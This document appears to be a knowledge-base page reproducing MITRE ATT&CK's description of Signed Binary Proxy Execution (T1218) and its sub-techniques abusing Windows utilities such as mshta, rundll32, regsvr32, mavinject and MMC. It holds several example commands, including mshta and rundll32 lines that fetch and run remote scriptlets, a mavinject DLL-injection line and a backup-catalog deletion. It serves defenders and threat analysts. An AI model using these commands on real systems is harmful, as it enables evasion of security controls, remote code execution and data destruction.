Tactics: [[DEFENSE_EVASION]]
Tags: #mitre/attack/techniques/T1218  

# Signed Binary Proxy Execution - T1218
---
## Description
[more on T1218](https://attack.mitre.org/techniques/T1218)

Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.

---
## Sub-Techniques

#### Compiled HTML File - T1218.001
[more on T1218.001](https://attack.mitre.org/techniques/T1218/001)

Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. [1](https://docs.microsoft.com/previous-versions/windows/desktop/htmlhelp/microsoft-html-help-1-4-sdk) CHM content is displayed using underlying components of the Internet Explorer browser [2](https://msdn.microsoft.com/windows/desktop/ms644670) loaded by the HTML Help executable program (hh.exe). [3](https://msdn.microsoft.com/windows/desktop/ms524405)

A custom CHM file containing embedded payloads could be delivered to a victim then triggered by [[T1204_User Execution|User Execution (T1204)]]. CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe. [4](https://msitpros.com/?p=3909) [5](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8625)

#### Control Panel - T1218.002
[more on T1218.002](https://attack.mitre.org/techniques/T1218/002)

Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.

Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a `CPlApplet` function.[1](https://msdn.microsoft.com/library/windows/desktop/cc144185.aspx)[2](https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf) For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.[1](https://msdn.microsoft.com/library/windows/desktop/cc144185.aspx) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.[1](https://msdn.microsoft.com/library/windows/desktop/cc144185.aspx) [2](https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf)[3](https://blog.trendmicro.com/trendlabs-security-intelligence/control-panel-files-used-as-malicious-attachments/)

Malicious Control Panel items can be delivered via [[T1566_Phishing|Phishing (T1566)]] campaigns[2](https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf)[3](https://blog.trendmicro.com/trendlabs-security-intelligence/control-panel-files-used-as-malicious-attachments/) or executed as part of multi-stage malware.[4](https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered/) Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.

Adversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to `HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls`. Even when these registered DLLs do not comply with the CPL file specification and do not export `CPlApplet` functions, they are loaded and executed through its `DllEntryPoint` when Control Panel is executed. CPL files not exporting `CPlApplet` are not directly executable.[5](https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_InvisiMole.pdf)

#### CMSTP - T1218.003
[more on T1218.003](https://attack.mitre.org/techniques/T1218/003)

Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. [1](https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2003/cc786431(v=ws.10)) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.

Adversaries may supply CMSTP.exe with INF files infected with malicious commands. [2](https://twitter.com/ItsReallyNick/status/958789644165894146) Similar to [[T1218_Signed Binary Proxy Execution#Regsvr32 - T1218 010|Regsvr32 (T1218.010)]] / "Squiblydoo", CMSTP.exe may be abused to load and execute DLLs [3](https://msitpros.com/?p=3960) and/or COM scriptlets (SCT) from remote servers. [4](https://twitter.com/NickTyrer/status/958450014111633408) [5](https://github.com/api0cradle/UltimateAppLockerByPassList) [6](http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/) This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate, signed Microsoft application.

CMSTP.exe can also be abused to [[T1548_Abuse Elevation Control Mechanism#Bypass User Account Control - T1548 002|Bypass User Account Control (T1548.002)]] and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. [3](https://msitpros.com/?p=3960) [5](https://github.com/api0cradle/UltimateAppLockerByPassList) [6](http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/)

#### InstallUtil - T1218.004
[more on T1218.004](https://attack.mitre.org/techniques/T1218/004)

Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. [1](https://msdn.microsoft.com/en-us/library/50614e95.aspx) InstallUtil is digitally signed by Microsoft and located in the .NET directories on a Windows system: `C:\Windows\Microsoft.NET\Framework\v\InstallUtil.exe` and `C:\Windows\Microsoft.NET\Framework64\v\InstallUtil.exe`.

InstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute `[System.ComponentModel.RunInstaller(true)]`. [2](https://lolbas-project.github.io/lolbas/Binaries/Installutil/)

#### Mshta - T1218.005
[more on T1218.005](https://attack.mitre.org/techniques/T1218/005)

Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code [1](https://www.cylance.com/content/dam/cylance/pdfs/reports/Op_Dust_Storm_Report.pdf) [2](https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/) [3](https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html) [4](https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/) [5](https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html)

Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. [6](https://en.wikipedia.org/wiki/HTML_Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. [7](https://msdn.microsoft.com/library/ms536471.aspx)

Files may be executed by mshta.exe through an inline script: `mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))`

They may also be executed directly from URLs: `mshta http[:]//webserver/payload[.]hta`

Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. [8](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)

#### Msiexec - T1218.007
[more on T1218.007](https://attack.mitre.org/techniques/T1218/007)

Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).[1](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec) Msiexec.exe is digitally signed by Microsoft.

Adversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.[2](https://lolbas-project.github.io/lolbas/Binaries/Msiexec/)[3](https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/) Since it is signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the `AlwaysInstallElevated` policy is enabled.[4](https://docs.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated)

#### Odbcconf - T1218.008
[more on T1218.008](https://attack.mitre.org/techniques/T1218/008)

Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.[1](https://docs.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-2017) Odbcconf.exe is digitally signed by Microsoft.

Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to [[T1218_Signed Binary Proxy Execution#Regsvr32 - T1218 010|Regsvr32 (T1218.010)]], odbcconf.exe has a `REGSVR` flag that can be misused to execute DLLs (ex: `odbcconf.exe /S /A {REGSVR "C:\Users\Public\file.dll"}`). [2](https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/)[3](https://blog.trendmicro.com/trendlabs-security-intelligence/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses/)[4](https://blog.trendmicro.com/trendlabs-security-intelligence/cobalt-spam-runs-use-macros-cve-2017-8759-exploit/)

#### Regsvcs/Regasm - T1218.009
[more on T1218.009](https://attack.mitre.org/techniques/T1218/009)

Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET [[T1559_Inter-Process Communication#Component Object Model - T1559 001|Component Object Model (T1559.001)]] (COM) assemblies. Both are digitally signed by Microsoft. [1](https://msdn.microsoft.com/en-us/library/04za0hca.aspx) [2](https://msdn.microsoft.com/en-us/library/tzat5yw6.aspx)

Both utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: `[ComRegisterFunction]` or `[ComUnregisterFunction]` respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. [3](https://lolbas-project.github.io/lolbas/Binaries/Regsvcs/)[4](https://lolbas-project.github.io/lolbas/Binaries/Regasm/)

#### Regsvr32 - T1218.010
[more on T1218.010](https://attack.mitre.org/techniques/T1218/010)

Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe is also a Microsoft signed binary. [1](https://support.microsoft.com/en-us/kb/249873)

Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. [2](https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/) This variation of the technique is often referred to as a "Squiblydoo" attack and has been used in campaigns targeting governments. [3](https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/) [4](https://www.fireeye.com/blog/threat-research/2017/02/spear_phishing_techn.html)

Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [[T1546_Event Triggered Execution#Component Object Model Hijacking - T1546 015|Component Object Model Hijacking (T1546.015)]]. [3](https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/)

#### Rundll32 - T1218.011
[more on T1218.011](https://attack.mitre.org/techniques/T1218/011)

Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [[T1129_Shared Modules|Shared Modules (T1129)]]), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: `rundll32.exe {{DLLname, DLLfunction}}`).

Rundll32.exe can also be used to execute [[T1218_Signed Binary Proxy Execution#Control Panel - T1218 002|Control Panel (T1218.002)]] Item files (.cpl) through the undocumented shell32.dll functions `Control_RunDLL` and `Control_RunDLLAsUser`. Double-clicking a .cpl file also causes rundll32.exe to execute. [1](https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf)

Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: `rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"` This behavior has been seen used by malware such as Poweliks. [2](https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/)

Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command `rundll32.exe ExampleDLL.dll, ExampleFunction`, rundll32.exe would first attempt to execute `ExampleFunctionW`, or failing that `ExampleFunctionA`, before loading `ExampleFunction`). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending `W` and/or `A` to harmless ones.[3](https://www.attackify.com/blog/rundll32_execution_order/)[4](https://github.com/gtworek/PSBits/tree/master/NoRunDll)

#### Verclsid - T1218.012
[more on T1218.012](https://attack.mitre.org/techniques/T1218/012)

Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.[1](https://www.winosbite.com/verclsid-exe/ )

Adversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running `verclsid.exe /S /C {{CLSID}}`, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to [[T1218_Signed Binary Proxy Execution#Regsvr32 - T1218 010|Regsvr32 (T1218.010)]]). Since it is signed and native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse.[2](https://lolbas-project.github.io/lolbas/Binaries/Verclsid/)[3](https://redcanary.com/blog/verclsid-exe-threat-detection/)[4](https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/)[5](https://gist.github.com/NickTyrer/0598b60112eaafe6d07789f7964290d5)

#### Mavinject - T1218.013
[more on T1218.013](https://attack.mitre.org/techniques/T1218/013)

Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).[1](https://lolbas-project.github.io/lolbas/Binaries/Mavinject/)

Adversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. [[T1055_Process Injection#Dynamic-link Library Injection - T1055 001|Dynamic-link Library Injection (T1055.001)]]), allowing for arbitrary code execution (ex. `C:\Windows\system32\mavinject.exe PID /INJECTRUNNING PATH_DLL`).[2](https://cybersecurity.att.com/blogs/labs-research/lazarus-campaign-ttps-and-evolution)[3](https://reaqta.com/2017/12/mavinject-microsoft-injector/) Since mavinject.exe is digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process.

In addition to [[T1055_Process Injection#Dynamic-link Library Injection - T1055 001|Dynamic-link Library Injection (T1055.001)]], Mavinject.exe can also be abused to perform import descriptor injection via its `/HMODULE` command-line parameter (ex. `mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER`). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.[4](https://posts.specterops.io/mavinject-exe-functionality-deconstructed-c29ab2cf5c0e)

#### MMC - T1218.014
[more on T1218.014](https://attack.mitre.org/techniques/T1218/014)

Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console, or MMC, is a signed Windows binary and is used in several ways in either its GUI or in a command prompt.[1](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mmc)[2](https://docs.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/what-is-microsoft-management-console) MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.[3](https://www.ghacks.net/2017/06/10/windows-msc-files-overview/)

For example, `mmc C:\Users\foo\admintools.msc /a` will open a custom, saved console msc file in author mode.[1](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mmc) Another common example is `mmc gpedit.msc`, which will open the Group Policy Editor application window.

Adversaries may use MMC commands to perform malicious tasks. For example, `mmc wbadmin.msc delete catalog -quiet` deletes the backup catalog on the system (i.e. [[T1490_Inhibit System Recovery|Inhibit System Recovery (T1490)]]) without prompts to the user (Note: `wbadmin.msc` may only be present by default on Windows Server operating systems).[4](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin-delete-catalog)[5](https://www.virustotal.com/gui/file/0b4c743246478a6a8c9fa3ff8e04f297507c2f0ea5d61a1284fe65387d172f81/detection)

Adversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a [[T1559_Inter-Process Communication#Component Object Model - T1559 001|Component Object Model (T1559.001)]] class object.[6](https://docs.microsoft.com/en-us/windows/win32/com/clsid-key-hklm) Then, adversaries may create custom consoles with the "Link to Web Address" snap-in that is linked to the malicious CLSID subkey.[7](https://research.checkpoint.com/2019/microsoft-management-console-mmc-vulnerabilities/) Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: `mmc.exe -Embedding C:\path\to\test.msc`.[8](https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/)



